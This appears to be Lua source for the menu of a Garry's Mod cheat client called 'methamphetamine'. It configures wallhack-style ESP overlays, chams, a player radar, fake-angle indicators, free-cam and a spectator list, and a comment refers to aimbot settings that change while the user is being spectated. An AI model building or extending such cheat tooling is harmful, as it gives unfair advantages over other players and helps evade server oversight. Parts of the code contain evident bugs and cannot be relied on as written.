                name = "Team Color",
            },
            {
                name = "Health Color",
            },
            {
                name = "Rainbow",
            }
        }
    },
}
espdata.players = {
    {
        name = "Box",
        options = espdata.presets[1],
    },
    {
        name = "Health [Txt]",
        options = espdata.presets[2],
    },
    {
        name = "Health [Bar]",
        options = espdata.presets[2],
    },
    {
        name = "Weapon",
        options = espdata.presets[2],

    },
    {
        name = "Chams [P.]",
        options = espdata.presets[3],
        colors = espdata.presets[4]
        
    },
    {
        name = "Chams [W.]",
        options = espdata.presets[3],
        colors = espdata.presets[4]

    },
    {
        name = "Glow",
        options = espdata.presets[3],

    },
    {
        name = "Name",
        options = espdata.presets[2],

    },
    {
        name = "Distance",
        options = espdata.presets[2],

    },
    {
        name = "Team",
        options = espdata.presets[2],

    },
    {
        name = "Rank",
        options = espdata.presets[2],

    },
    {
        name = "Skeleton",
        options = {
            { name = "None" }   
        },
    },
}

espdata.misc = {
    {
        name = "FOV Circle",
        HideTypeDropdown = true,
        HideColorDropdown = true,
    },
    {
        name = "Crosshair",
        HideTypeDropdown = true,
        HideColorDropdown = true,
    },
    {
        name = "Target Text",
        HideTypeDropdown = true,
        HideColorDropdown = true,
    },
    {
        name = "Predicted Weapon",
        HideTypeDropdown = true,
        HideColorDropdown = true,
    },
    {
        name = "Real Angle Indicator",
        HideTypeDropdown = true,
        HideColorDropdown = true,
        
    },
    {
        name = "Fake Angle Indicator",
        HideTypeDropdown = true,
        HideColorDropdown = true,
    },
    {
        name = "Fake Angle Chams",
        HideTypeDropdown = false,
        HideColorDropdown = true,
        options = {
            {name = "Flat"}
        }
    },
}


local PANEL = {}

function  PANEL:Init()
    methamphetamine.mods["ESP"].masterToggleKeybind = 0
    methamphetamine.mods["ESP"]["BoxRounding"] = 0

    methamphetamine.mods["ESP"]["colors"] = {
        ["Box"] = color_white,
        ["Health [Txt]"] = color_white,
        ["Health [Bar]"] = color_white,
        ["Chams [P.]"] = color_white,
        ["Chams [W.]"] = color_white,
        ["Glow"] = color_white,
        ["Name"] = color_white,
        ["Distance"] = color_white,
        ["Team"] = color_white,
        ["Rank"] = color_white,
        ["Skeleton"] = color_white,
    }
    methamphetamine.mods["ESP"]["enabled"] = {
        ["Box"] = false,
        ["Health [Txt]"] = false,
        ["Health [Bar]"] = false,
        ["Chams [P.]"] = false,
        ["Chams [W.]"] = false,
        ["Glow"] = false,
        ["Name"] = false,
        ["Distance"] = false,
        ["Team"] = false,
        ["Rank"] = false,
        ["Skeleton"] = false,
    }
    methamphetamine.mods["ESP"]["types"] = {
        ["Box"] = "2D [None]",
        ["Health [Txt]"] = "Top",
        ["Name"] = "Top",
        ["Distance"] = "Top",
        ["Team"] = "Top",
        ["Rank"] = "Top",
    }
    methamphetamine.mods["ESP"]["colortype"] = {
        ["Box"] = "Selected Color",
        ["Health [Txt]"] = "Selected Color",
        ["Health [Bar]"] = "Selected Color",
        ["Chams [P.]"] = "Selected Color",
        ["Chams [W.]"] = "Selected Color",
        ["Glow"] = "Selected Color",
        ["Name"] = "Selected Color",
        ["Distance"] = "Selected Color",
        ["Team"] = "Selected Color",
        ["Rank"] = "Selected Color",
        ["Skeleton"] = "Selected Color",
    }
    methamphetamine.mods["ESP"]["Ignore"] = {
        ["Dormat"] = false,
        ["Same Team"] = false,
        ["Opposite Team"] = false,
        ["Noclipping"] = false,
        ["Transparent"] = false,
        ["Invisible"] = false,
    }
    methamphetamine.mods["ESP"]["Freecam"] = {
        ["Enabled"] = false,
        ["Key"] = 0,
        ["Speed"] = 0,
    }
    methamphetamine.mods["ESP"]["ThirdPerson"] = {
        ["Enabled"] = false,
        ["Key"] = 0,
        ["Distance"] = 0,

    }
    methamphetamine.mods["ESP"]["Range"] = 3000

    
    self.players = self:Add("methamphetamine.panel")
    self.players.espdata = espdata
    self.players:Dock(LEFT)
    self.players:SetPos(0,7)
    self.players.lblpnl = self.players:Add("Panel")
    self.players.lblpnl:Dock(TOP)
    self.players.lblpnl:SetTall(23)
    self.players.lblpnl.Paint = function(pnl,w,h)
        surface.SetDrawColor( methamphetamine.colors.border )
        surface.DrawRect(5,h-1,w-10,1)
    end
    self.players.label = self.players.lblpnl:Add("DLabel")
    self.players.label:Dock(BOTTOM)
    self.players.label:SetText( "Players" )
    self.players.label:SetFont( methamphetamine.default.font )
    self.players.label:SetTextColor( methamphetamine.colors.text )
    self.players.label:DockMargin(8,0,0,0)
    self.players.label:SizeToContents()

    local players = self.players
    
    players.panels = {}
    for k , v in ipairs( players.espdata.players ) do
        players.panels[k] = players:Add("methamphetamine.espoption")
        local option = players.panels[k]
        option:Dock(TOP)
        option:SetTall(20)
        option:DockMargin(4,1,4,1)
        option:SetText( v.name )
        option.OnColourChanged = function(pnl,col)
            methamphetamine.mods["ESP"].colors[ v.name ] = col
        end
        option.activecol:Configure("ESP","colors",v.name)
        option.toggle.OnToggle = function(pnl,state)
            methamphetamine.mods["ESP"].enabled[ v.name ] = state
        end 
        option.toggle:Configure("ESP","enabled",v.name)
        for k , op in ipairs( v.options or { name = "None" } ) do
            option:AddChoice( op.name , function(pnl,id,name) methamphetamine.mods["ESP"].types[ v.name ] = op.name end)
            option:Configure("ESP","types",v.name)
        end
        for k , col in ipairs( v.colors or players.espdata.presets[5] ) do
            option.espcol:AddChoice( col.name , function(panel,id,name) methamphetamine.mods["ESP"].colortype[ v.name ] = name end)
            option.espcol:Configure("ESP","colortype",v.name)
        end
    end
    

    self.miscplayers = self:Add("methamphetamine.panel")
    self.miscplayers:Dock(LEFT)
    self.miscplayers:SetPos(0,7)
    self.miscplayers.lblpnl = self.miscplayers:Add("Panel")
    self.miscplayers.lblpnl:Dock(TOP)
    self.miscplayers.lblpnl:SetTall(23)
    self.miscplayers.lblpnl.Paint = function(pnl,w,h)
        surface.SetDrawColor( methamphetamine.colors.border )
        surface.DrawRect(5,h-1,w-10,1)
    end
    self.miscplayers.label = self.miscplayers.lblpnl:Add("DLabel")
    self.miscplayers.label:Dock(BOTTOM)
    self.miscplayers.label:SetText( "Misc Players" )
    self.miscplayers.label:SetFont( methamphetamine.default.font )
    self.miscplayers.label:SetTextColor( methamphetamine.colors.text )
    self.miscplayers.label:DockMargin(8,0,0,0)
    self.miscplayers.label:SizeToContents()
    local misc = self.miscplayers

    misc.panels = {}
    for k , v in ipairs( espdata.misc ) do
        misc.panels[k] = misc:Add("methamphetamine.espoption")
        local option = misc.panels[k]
        if v.HideColorDropdown then
            option:HideColorDropdown(true)
        end
        if v.HideTypeDropdown then
            option:HideTypeDropdown(true)
        end
        option.esptype:SetWide(80)
        option:Dock(TOP)
        option:SetTall(20)
        option:DockMargin(4,1,4,1)
        option:SetText( v.name )
        option.OnColourChanged = function(pnl,col)
            methamphetamine.mods["ESP"].colors[ v.name ] = col
        end
        option.activecol:Configure("ESP","colors",v.name)
        option.toggle.OnToggle = function(pnl,state)
            methamphetamine.mods["ESP"].enabled[ v.name ] = state
        end 
        option.toggle:Configure("ESP","enabled",v.name)
        for k , op in ipairs( v.options or { name = "None" } ) do
            option.esptype:AddChoice( op.name , function(pnl,id,name) methamphetamine.mods["ESP"].types[ v.name ] = op.name end)
            option.esptype:Configure("ESP","types",v.name)
        end
    end

    misc.BoxRounding = misc:Add("Panel")
    misc.BoxRounding:Dock(TOP)
    misc.BoxRounding:SetTall(35)
    misc.BoxRounding:DockMargin(4,1,4,1)
    misc.BoxRounding.Label = misc.BoxRounding:Add("DLabel")
    misc.BoxRounding.Label:Dock(TOP)
    misc.BoxRounding.Label:SetText("Box Rounding")
    misc.BoxRounding.Label:SetFont(methamphetamine.default.font)
    misc.BoxRounding.Label:SetTextColor(methamphetamine.colors.text)
    misc.BoxRounding.Label:SizeToContents()
    misc.BoxRounding.Slider = misc.BoxRounding:Add("methamphetamine.slider")
    misc.BoxRounding.Slider:Dock(BOTTOM)
    misc.BoxRounding.Slider:SetTall(20)
    misc.BoxRounding.Slider:SetMin(0)
    misc.BoxRounding.Slider:SetMax(12)
    misc.BoxRounding.Slider:SetValue(0)
    misc.BoxRounding.Slider.OnValueChanged = function(pnl,val)
        methamphetamine.mods["ESP"].BoxRounding = val*pnl:GetMax()
    end

    misc.GlowThickness = misc:Add("Panel")
    misc.GlowThickness:Dock(TOP)
    misc.GlowThickness:SetTall(35)
    misc.GlowThickness:DockMargin(4,1,4,1)
    misc.GlowThickness.Label = misc.GlowThickness:Add("DLabel")
    misc.GlowThickness.Label:Dock(TOP)
    misc.GlowThickness.Label:SetText("Glow Thickness")
    misc.GlowThickness.Label:SetFont(methamphetamine.default.font)
    misc.GlowThickness.Label:SetTextColor(methamphetamine.colors.text)
    misc.GlowThickness.Label:SizeToContents()
    misc.GlowThickness.Slider = misc.GlowThickness:Add("methamphetamine.slider")
    misc.GlowThickness.Slider:Dock(BOTTOM)
    misc.GlowThickness.Slider:SetTall(20)
    misc.GlowThickness.Slider:SetMin(0)
    misc.GlowThickness.Slider:SetMax(6)
    misc.GlowThickness.Slider:SetValue(0)
    misc.GlowThickness.Slider = function(pnl,val)
        methamphetamine.mods["ESP"].GlowThickness = val*pnl:GetMax()
    end

    misc.RainbowSpeed = misc:Add("Panel")
    misc.RainbowSpeed:Dock(TOP)
    misc.RainbowSpeed:SetTall(35)
    misc.RainbowSpeed:DockMargin(4,1,4,1)
    misc.RainbowSpeed.Label = misc.RainbowSpeed:Add("DLabel")
    misc.RainbowSpeed.Label:Dock(TOP)
    misc.RainbowSpeed.Label:SetText("Rainbow Speed")
    misc.RainbowSpeed.Label:SetFont(methamphetamine.default.font)
    misc.RainbowSpeed.Label:SetTextColor(methamphetamine.colors.text)
    misc.RainbowSpeed.Label:SizeToContents()
    misc.RainbowSpeed.Slider = misc.RainbowSpeed:Add("methamphetamine.slider")
    misc.RainbowSpeed.Slider:Dock(BOTTOM)
    misc.RainbowSpeed.Slider:SetTall(20)
    misc.RainbowSpeed.Slider:SetMin(0)
    misc.RainbowSpeed.Slider:SetMax(6)
    misc.RainbowSpeed.Slider:SetValue(0)
    misc.RainbowSpeed.Slider = function(pnl,val)
        methamphetamine.mods["ESP"].RainbowSpeed = val*pnl:GetMax()
    end

    misc.WeaponMode = misc:Add("Panel")
    misc.WeaponMode:Dock(TOP)
    misc.WeaponMode:SetTall(35)
    misc.WeaponMode:DockMargin(4,1,4,1)
    misc.WeaponMode.Label = misc.WeaponMode:Add("DLabel")
    misc.WeaponMode.Label:Dock(TOP)
    misc.WeaponMode.Label:SetText("Weapon Mode")
    misc.WeaponMode.Label:SetFont(methamphetamine.default.font)
    misc.WeaponMode.Label:SetTextColor(methamphetamine.colors.text)
    misc.WeaponMode.Label:SizeToContents()
    misc.WeaponMode.Dropdown = misc.WeaponMode:Add("methamphetamine.dropdown")
    misc.WeaponMode.Dropdown:Dock(BOTTOM)
    misc.WeaponMode.Dropdown:SetValue(0)
    misc.WeaponMode.Dropdown:AddChoice("Held",function(panel,id,name) metamphetamine.mods.ESP.WeaponMode = name end)

    misc.MiscOptions = misc:Add("Panel")
    misc.MiscOptions:Dock(TOP)
    misc.MiscOptions:SetTall(20)
    misc.MiscOptions:DockMargin(4,1,4,1)

    misc.FreeCam = misc.MiscOptions:Add("methamphetamine.miscdrop")
    misc.FreeCam:Dock(LEFT)
    misc.FreeCam:DockMargin(1,0,1,0)
    misc.FreeCam:SetText("Freecam")
    misc.FreeCam:SetPanelWidth(220)
    misc.FreeCam:SizeToContents()
    misc.FreeCam:AddOption("Enable",{
        panel = "methamphetamine.checkbox",
        text = "Enable",
        OnToggle = function(pnl, state)
            methamphetamine.mods.ESP.Freecam.Enabled = state 
        end,
        Configure = {"ESP","Freecam","Enabled"}
    })
    misc.FreeCam:AddOption("Key",{
        panel = "methamphetamine.binder",
        text = "Free cam key",
        OnChange = function(pnl, key)
            methamphetamine.mods.ESP.Freecam.Key = key
        end,
        Configure = {"ESP","Freecam","Key"}
    })
    misc.FreeCam:AddOption("Speed",{
        panel = "methamphetamine.slider",
        text = "Free cam speed",
        max = 15,
        OnValueChanged = function(pnl, val)
            methamphetamine.mods.ESP.Freecam.Speed = val*15
        end,
        Configure = {"ESP","Freecam","Speed"},
    })

    misc.ThirdPerson = misc.MiscOptions:Add("methamphetamine.miscdrop")
    misc.ThirdPerson:Dock(LEFT)
    misc.ThirdPerson:DockMargin(1,0,1,0)
    misc.ThirdPerson:SetText("Third Person")
    misc.ThirdPerson:SetPanelWidth(255)
    misc.ThirdPerson:SizeToContents()
    misc.ThirdPerson:AddOption("Enable",{
        panel = "methamphetamine.checkbox",
        text = "Enable",
        OnToggle = function(pnl, state)
            methamphetamine.mods.ESP.ThirdPerson.Enabled = state 
        end,
        Configure = {"ESP","ThirdPerson","Enabled"}
    })
    misc.ThirdPerson:AddOption("Key",{
        panel = "methamphetamine.binder",
        text = "Third Person key",
        OnChange = function(pnl, key)
            methamphetamine.mods.ESP.ThirdPerson.Key = key
        end,
        Configure = {"ESP","ThirdPerson","Key"}
    })
    misc.ThirdPerson:AddOption("Speed",{
        panel = "methamphetamine.slider",
        text = "Third Person Distance",
        max = 150,
        OnValueChanged = function(pnl, val)
            methamphetamine.mods.ESP.ThirdPerson.Distance = val*150
        end,
        Configure = {"ESP","ThirdPerson","Distance"},
    })

    misc.Ignore = misc.MiscOptions:Add("methamphetamine.miscdrop")
    misc.Ignore:Dock(LEFT)
    misc.Ignore:DockMargin(1,0,1,0)
    misc.Ignore:SetText("Ignore")
    misc.Ignore:SetPanelWidth(280)
    misc.Ignore:SizeToContents()
    misc.Ignore:AddOption("Dormant",{
        panel = "methamphetamine.checkbox",
        text = "Dormant",
        OnToggle = function(pnl, state)
            methamphetamine.mods.ESP.Ignore.Dormant = state 
        end,
        Configure = {"ESP","Ignore","Dormant"},
    })
    misc.Ignore:AddOption("Distance",{
        panel = "methamphetamine.slider",
        text = "Max Distance",
        max = 20000,
        OnValueChanged = function(pnl, val)
            methamphetamine.mods.ESP.Range = val*20000
        end,
        Configure = {"ESP","Range"},
    })

    misc.Highlight = misc.MiscOptions:Add("methamphetamine.miscdrop")
    misc.Highlight:Dock(LEFT)
    misc.Highlight:DockMargin(1,0,1,0)
    misc.Highlight:SetText("Highlight")
    misc.Highlight:SetPanelWidth(280)
    misc.Highlight:SizeToContents()
    misc.Highlight:AddOption("Dormant",{
        panel = "methamphetamine.checkbox",
        text = "Dormant",
        OnToggle = function(pnl, state)
            methamphetamine.mods.ESP.Highlight.Dormant = state 
        end,
        Configure = {"ESP","Highlight","Dormant"},
    })
    misc.Highlight:AddOption("Distance",{
        panel = "methamphetamine.slider",
        text = "Max Distance",
        max = 20000,
        OnValueChanged = function(pnl, val)
            methamphetamine.mods.ESP.Range = val*20000
        end,
        Configure = {"ESP","Range"},
    })
end

--[[
        options.ignorepnl.ignore:AddOption("Toggle",{
        panel = "methamphetamine.checkbox",
        text = "Change on Spectation",
        tooltip = "Forces aimbot settings to the ones below while being spectated",
    })
    options.ignorepnl.ignore:AddOption("ToggleAimbot",{
        panel = "methamphetamine.checkbox",
        text = "Enabled",
        tooltip = "Enables the aimbot.",
    })
    options.ignorepnl.ignore:AddOption("Toggle3",{
        panel = "methamphetamine.slider",
        text = "Change on Spectation",
        tooltip = "Forces aimbot settings to the ones below while being spectated",
        max = 10
    })
]]

function PANEL:PerformLayout(w,h)
    self.players:SetWide(w*0.55-2)
    self.players:DockMargin(0,0,2,0)
    self.miscplayers:SetWide(w*0.45-2)
    self.miscplayers:DockMargin(2,0,0,0)

end


vgui.Register("methamphetamine.esp.player",PANEL)

if not file.Exists("methamphetamine/configs","DATA") then
    file.CreateDir("methamphetamine/configs")
end

local PANEL = {}

function PANEL:Init()    
    self.label = self:Add("DLabel")
    self.label:SetFont( methamphetamine.default.font )
    self.label:SetTextColor( methamphetamine.colors.text )
    self.label:SetText("Available configs:")
    self.label:SizeToContents()
    self.label:SetPos(4,0)
    self.configs = self:Add("Panel")
    self.configs:SetPos(4,20)
    self.configs:SetSize(150,270)
    self.configs.Paint = function(pnl,w,h)
        surface.SetDrawColor(methamphetamine.colors.buttonidle)
        surface.DrawRect(0,0,w,h)
    end
    self.configs.list = self.configs:Add("DScrollPanel")
    self.configs.list:Dock(FILL)
    self.configs.list.configs = {}
    self.buttons = self:Add("Panel")
    self.buttons:SetPos(4,294)
    self.buttons:SetSize(150,20)
    self.refresh = self.buttons:Add("DButton")
    self.refresh:Dock(LEFT)
    self.refresh:SetText("Refresh")
    self.refresh:SetFont( methamphetamine.default.font )
    self.refresh:SetTextColor( methamphetamine.colors.text )
    self.refresh:SizeToContents(8)
    self.refresh.Paint = function(pnl,w,h)
        surface.SetDrawColor(pnl:IsHovered() and methamphetamine.colors.border or methamphetamine.colors.hovered)
        surface.DrawRect(0,0,w,h)
    end
    self.refresh.DoClick = function()
        self:Refresh()
    end
    self.new = self.buttons:Add("DButton")
    self.new:Dock(LEFT)
    self.new:DockMargin(4,0,0,0)
    self.new:SetText("New")
    self.new:SetFont( methamphetamine.default.font )
    self.new:SetTextColor( methamphetamine.colors.text )
    self.new:SizeToContents(8)
    self.new.Paint = function(pnl,w,h)
        surface.SetDrawColor(pnl:IsHovered() and methamphetamine.colors.border or methamphetamine.colors.hovered)
        surface.DrawRect(0,0,w,h)
    end
    self.new.DoClick = function(pnl)
        Derma_StringRequest(
            "Save config", 
            "Set a name for this config",
            "",
            function(text) 
                local dir = "methamphetamine/configs/".. text .. ".txt"
                file.Write( dir , util.TableToJSON(methamphetamine.mods,true) )
                self:Refresh()
            end
        )
    end

    self:Refresh()
end

function PANEL:Refresh()
    self.configs.list:Clear()
    local dir = "methamphetamine/configs"
    local files,_ = file.Find( dir .. "/*.txt" , "DATA" )
    methamphetamine.configs = {}
    for k , v in ipairs( files ) do
        methamphetamine.configs[string.sub(v,1,#v-4)] = {util.JSONToTable( file.Read(dir.. "/".. v ) ),v}
    end

    --PrintTable( methamphetamine.configs )
    for k , v in pairs( methamphetamine.configs ) do
        self.configs.list.configs[#self.configs.list.configs + 1] = self.configs.list:Add("DButton")
        local conf = self.configs.list.configs[#self.configs.list.configs ]
        conf:Dock(TOP)
        conf:SetTall(20)    
        conf.config = v[1]
        conf.DoClick = function(pnl)
            methamphetamine.mods = pnl.config

            hook.Run("methamphetamine.configLoaded",pnl.config)
        end
        conf.DoRightClick = function(pnl)
            Derma_Query("Are you sure you want to remove ".. k .. "?","poo","Yes",function()
                file.Delete( "methamphetamine/configs/"..v[2] )
        
                self:Refresh()
            end,"No",function() end)
        end
        conf.Paint = function(pnl,w,h)
            surface.SetDrawColor(pnl:IsHovered() and methamphetamine.colors.border or methamphetamine.colors.hovered)
            surface.DrawRect(0,0,w,h)
            surface.SetTextPos(4,2)
            surface.SetTextColor( methamphetamine.colors.text )
            surface.SetFont( methamphetamine.default.font )
            surface.DrawText( k )
        end
        conf:SetText("")
    end
end
vgui.Register("methamphetamine.configs",PANEL)

local mods = {
    [0]  = {}
}

function mods:Add( name , func )
    mods[ #mods+1 ] = {
        isToggled = false,
        func = func,
        name = name,
    }   
    mods[0][name] = mods[#mods]
    return mods[0][name]
end

mods:Add("Spectators", function( mod, toggle )
    if not toggle then
        mod.panel:Remove()
        timer.Remove("methamphetamine.spectaterefresh")
        return
    end
    mod.panel = vgui.Create("methamphetamine.frame")
    mod.panel:SetSize(120,200)
    mod.panel:Center()
    mod.panel:SetTitle("Spectator List")
    mod.panel:SetResizeable( true )
    mod.panel:SetZPos(-1)
    mod.panel.names = {}
    timer.Create("methamphetamine.spectaterefresh",5,0, function()
        if not IsValid( mod.panel ) then timer.Remove("methamphetamine.spectaterefresh") return end 
        for k , v in ipairs(mod.panel.names) do
            v:Remove()
        end
        for k , v in ipairs( player.GetAll() ) do
            if v:GetObserverTarget() == LocalPlayer then
                mod.panel.names[#mod.panel.names + 1] = mod.panel:Add("DLabel")
                local pnl = mod.panel.names[#mod.panel.names]
                pnl:Dock(TOP)
                pnl:DockMargin(4,2,4,2)
                pnl:SetFont( methamphetamine.default.font )
                pnl:SetText( v:Nick() )
                pnl:SizeToContents()
            end
        end
    end)
    
end)
local plyarrow = Material("meth/player-arrow.png")
surface.CreateFont("methamphetamine.radar", {
    font = "Raleway",
    size = 12,
    weight = 100,
})
mods:Add("Radar", function( mod, toggle )
    if not toggle then
        mod.panel:Remove()
        return
    end
    mod.panel = vgui.Create("methamphetamine.frame")
    mod.panel:SetSize(290,290)
    mod.panel:Center()
    mod.panel:SetTitle("Radar")
    mod.panel:SetResizeable( true )
    mod.panel:SetZPos(-1)
    mod.panel.scale = 0.1
    local plycol = color_white
    local deadplayerarrow = Color(240,90,90)
    mod.panel.PaintOver = function(pnl,w,h)

        local angs = LocalPlayer:GetAngles()
        surface.SetMaterial( plyarrow ) 
        surface.SetDrawColor( plycol ) -- YOU
        surface.DrawTexturedRectRotated(w/2-8,h/2-8,16,16, angs.y  )
        for k , v in ipairs( player.GetAll() ) do
            --if LocalPlayer:GetPos():DistToSqr( v:GetPos() ) > 300*300 or v == LocalPlayer then return end
            if v == LocalPlayer then goto skip end

            local plypos = (LocalPlayer:GetShootPos() - v:GetPos())
            --print( plypos )
            local plyang = v:EyeAngles()
            surface.SetMaterial( plyarrow ) 
            surface.SetDrawColor( not v:Alive() and deadplayerarrow or plycol )
            surface.DrawTexturedRectRotated( w/2 + (plypos.y * pnl.scale) - 8 , h/2 + (plypos.x*pnl.scale) - 8 ,16,16, plyang.y )
            draw.SimpleText( v:Nick() , "methamphetamine.radar", w/2 + (plypos.y * pnl.scale) - 8 , h/2 + (plypos.x*pnl.scale) , color_white, 1 )
            ::skip::
        end
    end
    
end)

mods:Add("Test Search", function( mod , toggle )
    if not toggle then
        mod.panel:Remove()
        return
    end
    mod.panel = vgui.Create("methamphetamine.frame")
    mod.panel:SetSize(450,292)
    mod.panel:Center()
    mod.panel:SetTitle("Test Search")
    mod.panel:SetResizeable( true )
    mod.panel.search = mod.panel:Add("methamphetamine.search")
    mod.panel.search:Dock(TOP)
    mod.panel.search:SetTall(20)
    mod.panel.search:DockMargin(6,6,6,6)
  
end)    

local radiostations = {}
if not file.Exists("methamphetamine/radio", "DATA") then
    file.CreateDir("methamphetamine/radio")
end
local txt = file.Read("methamphetamine/radio/recent.txt", "DATA")
if not file.Exists("methamphetamine/radio/recent.txt", "DATA") then file.Write("methamphetamine/radio/recent.txt", util.TableToJSON({}) ) end
local function recent( name , url )
    local data = file.Read("methamphetamine/radio/recent.txt", "DATA")
    local tbl = util.JSONToTable( data )
    tbl[#tbl + 1] = {name = name, url = url}
    file.Write( "methamphetamine/radio/recent.txt", util.TableToJSON(tbl,true) )
end
local data = function()
    return util.JSONToTable(file.Read("methamphetamine/radio/recent.txt","DATA"))
end
--methamphetamine.currentradiostation = methamphetamine.currentradiostation 
methamphetamine.currentradiostationname = 'Nothing'

local function PlaySong( link )
    if IsValid( methamphetamine.currentradiostation ) then
        methamphetamine.currentradiostation:Stop()
    end
    sound.PlayURL( link , "noblock", function(chan, err, errstr)
        if IsValid( chan ) then
            hook.Add("Think","methamphetamine.radio",function()
            
                chan:SetPos(  LocalPlayer:GetPos() )

            end)
            methamphetamine.currentradiostation = chan
        else
            MsgC("Invalid URL (" .. link .. ")"  )
        end
    end)    

end
--PlaySong("https://dl5.youtubetomp3music.com/file/youtubeszrDcTGvp7o128.mp3?fn=STORMZY%20%E2%80%93%20RAINFALL%20(FEAT.%20TIANA%20MAJOR9).mp3")
local function playYTUrl( url )
    local _,start = string.find( url, "youtube.com/")
    local url = "https://www.320youtube.com/v7".. string.sub( url , start, #url )
    print( url )
    local newURL = ""
    http.Fetch( url , function( body, len, headers, code )
        local start,_end = ( string.find( body , ".ytapivmp3.com/download") )
        local megaEnd = string.find( string.sub(body, start) , "/1\"" )
        --print( start, megaEnd )
        --print( string.sub( body , start, start + megaEnd  ) )
        local urlStart = string.find( string.sub( body , start - 61 , start ), "https:" )
        newURL = ( string.sub( body , start + urlStart - 60 , start + megaEnd ) )
        --print("URL START = ", string.sub( body , start + urlStart - 60 , start + megaEnd ) )
        --print("URL START = ", "ht"..newURL )
        newURL = "ht"..newURL
        --local newURL = string.sub( body  , urlStart, megaEnd ) 
        --print( newURL )
        sound.PlayURL ( newURL , "noblock", function( station )
            --print("CALLED_123213")
            -- if _station then
            if ( IsValid( station ) ) then
                if IsValid( methamphetamine.currentradiostation ) then
                    methamphetamine.currentradiostation:Stop()
                end
                methamphetamine.currentradiostation = station

            --         _station:Stop()
            --     end
            --     _station = station
        
                hook.Add("Think", "methamphetamine.radiofollow", function()
                    if IsValid( methamphetamine.currentradiostation ) then
                        methamphetamine.currentradiostation:SetPos( EyePos() )
                    else
                        hook.Remove("Think", "methamphetamine.radiofollow")
                    end
                end)
            
                methamphetamine.currentradiostation:Play()

                http.Fetch(newURL,	function( body, length, headers, code )
                    local start,ends,_ = string.find( body , "<title>",20,true)
                    local _end,_,_ = string.find( body , "</title", 20, true )
                    local title = string.sub(body,ends+1,_end-1)
                    local removestart,removeend,_ = string.find(title,"| 320")
                    local title = string.sub(title,0,removestart-1)
                    methamphetamine.currentradiostationname = title 
             
                end)
                
            
            else
        
                LocalPlayer:ChatPrint( "Invalid URL!" )
        
            end
        end )
    end)
    print("\n\nPLAYING  ", tostring(newURL) , "\n\n")
    
end



methamphetamine.radiostations = {
	{
		Name = "Drive Radio",
        Link = "http://listen.radionomy.com/drive.m3u",
        Description = "the radio station striictly for driving",
	},
	{
		Name = "Classic Rock Florida",
        Link = "https://vip2.fastcast4u.com/proxy/classicrockdoug?mp=/1",
        Description = "tends to be a little gay",
	},
	{
		Name = "Soma.fm",
        Link = "http://somafm.com/groovesalad.pls",
        Description = "soma fm",
	},
	{
		Name = "Chillhop",
        Link = "https://stream.amazingradios.com/chillhop",
        Description = "chill hop",
	},
	{
		Name = "Smooth Jazz",
        Link = "https://www.internet-radio.com/servers/tools/playlistgenerator/?u=http://us4.internet-radio.com:8266/listen.pls&t=.m3u",
        Description = "Smooth jazz",
	},
	{
		Name = "Oldies",
        Link = "https://www.internet-radio.com/servers/tools/playlistgenerator/?u=http://uk3.internet-radio.com:8405/live.m3u&t=.m3u",
        Description = "Old people music or something",
	},
	{
		Name = "Radio Charwell",
        Link = "https://www.internet-radio.com/servers/tools/playlistgenerator/?u=http://uk6.internet-radio.com:8144/listen.pls&t=.m3u",
        Description = "Radio yes",
	},
	{
		Name = "Reggae",
        Link = "https://www.internet-radio.com/servers/tools/playlistgenerator/?u=http://uk6.internet-radio.com:8213/listen.pls&t=.m3u",
        Description = "Jamaica",
	},
	{
		Name = "Meagton Cafe",
        Link = "https://www.internet-radio.com/servers/tools/playlistgenerator/?u=http://us2.internet-radio.com:8443/listen.pls&t=.m3u",
        Description = "Piano songs i guess",
	},
	{
		Name = "K-Pop",
        Link = "https://www.internet-radio.com/servers/tools/playlistgenerator/?u=http://167.114.64.181:8325/listen.pls?sid=1&t=.m3u",
        Description = "Nani",
	},
	{
		Name = "Telemedellin Radio",
        Link = "https://www.internet-radio.com/servers/tools/playlistgenerator/?u=http://51.222.14.10:8058/listen.pls?sid=1&t=.m3u",
        Description = "Telemedellin"
	},
}

local pausemat = Material("meth/pause.png")
local playmat = Material("meth/play.png")
local skipmat = Material("meth/skip.png")
local skipbackmat = Material("meth/skipback.png")

local PANEL = {}
function PANEL:Init()
    self.contents = self:Add("Panel")
    self.contents:Dock(FILL)
    self.scroll = self.contents:Add("DScrollPanel")
    self.scroll:Dock(FILL)
    local vbar = self.scroll:GetVBar()
    vbar:SetHideButtons( true )
    vbar.Paint = function(pnl,w,h)
        draw.RoundedBox(4,0,0,w,h,methamphetamine.colors.gripbackground)
    end
    vbar.btnGrip.Paint = function(pnl,w,h)
        draw.RoundedBox(4,0,0,w,h,methamphetamine.colors.grip)
    end
    vbar:SetWide(4)
    vbar:DockMargin(1,1,1,1)
    for k , v in ipairs(methamphetamine.radiostations) do
        local song = self.scroll:Add("DPanel")
        song:Dock(TOP)
        song:SetTall(40)
        song.table = v
        song.Paint = function(pnl,w,h)
            draw.SimpleText(v.Name,methamphetamine.default.font,8,8,methamphetamine.colors.text,0,0)
            draw.SimpleText(v.Description,methamphetamine.default.font,8,25,methamphetamine.colors.activebutton,0,2)
        end
        song.play = song:Add("DButton")
        song.play:Dock(RIGHT)
        song.play:SetWide( song:GetTall() )
        song.play:SetText("")
        song.play.Paint = function(pnl,w,h)
            surface.SetMaterial( playmat )
            surface.SetDrawColor( pnl:IsHovered() and methamphetamine.colors.disabledtext or methamphetamine.colors.activebutton )
            surface.DrawTexturedRect(8,8,w-16,h-16)
        end
        song.play.DoClick = function(pnl)
            methamphetamine.currentradiostationname = v.Name
            PlaySong( v.Link )
        end
    end
end
vgui.Register("methamphetamine.radiopage", PANEL)


mods:Add("Radio Stations", function( mod , toggle )
    if not toggle then 
        mod.panel:Remove()
        return
    end
    mod.panel = vgui.Create("methamphetamine.frame")
    mod.panel:SetSize(350,400)
    mod.panel:Center()
    mod.panel:SetTitle("Radio Stations")
    mod.panel.current = mod.panel:Add("Panel")
    mod.panel.current:Dock(TOP)
    mod.panel.current:DockMargin(0,5,0,0)
    mod.panel.current:SetTall(80)
    mod.panel.current.Paint =  function(pnl,w,h)
        draw.SimpleText("Currently Playing \"" .. methamphetamine.currentradiostationname .. "\"" , methamphetamine.default.font, w/2, h*0.2, methamphetamine.colors.text,1,1 )
        draw.RoundedBox(4,w*0.15,h*0.4,w*0.7,4, methamphetamine.colors.border )
        if IsValid(methamphetamine.currentradiostation) then
            draw.RoundedBox(6,w*0.15 + (methamphetamine.currentradiostation:GetTime()/methamphetamine.currentradiostation:GetLength()) * w*0.7,h*0.4-3,6,6, methamphetamine.colors.border)
